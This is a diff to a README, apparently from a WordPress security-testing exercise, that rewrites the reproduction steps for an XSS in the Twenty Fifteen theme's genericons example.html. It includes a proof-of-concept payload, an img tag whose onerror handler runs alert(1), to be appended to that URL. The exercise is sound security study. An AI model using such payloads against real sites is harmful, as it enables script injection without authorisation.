@@ -12,8 +12,11 @@ Time spent: **X** hours spent in total
     - Tested in version: 4.1
   - [x] GIF Walkthrough: https://gfycat.com/TartEnchantedGallowaycow
   - [x] Steps to recreate: 
+        Add xss code to end of the url
+        ```
+        <img src=1 onerror="alert(1)">
+        ``` 
         Use url: wp-content/themes/twentyfifteen/genericons/example.html#1
-        '''<img src=1 onerror="alert(1)">''' 
   - [x] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Required) XSS Authenticated Cross-Site Scripting with Media Files
